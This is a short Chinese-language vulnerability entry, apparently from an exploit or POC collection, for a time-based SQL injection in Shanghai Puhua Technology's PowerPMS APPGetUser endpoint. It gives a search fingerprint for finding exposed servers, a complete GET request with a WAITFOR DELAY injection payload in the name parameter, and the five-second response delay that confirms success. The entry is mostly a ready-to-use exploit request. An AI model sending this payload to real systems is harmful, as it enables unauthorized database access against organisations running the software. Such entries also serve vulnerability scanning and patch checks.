# 上海普华科技发展股份有限公司PowerPMS-APPGetUser存在SQL注入

上海普华科技发展股份有限公司 ｜ SQL注入 ｜ —
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s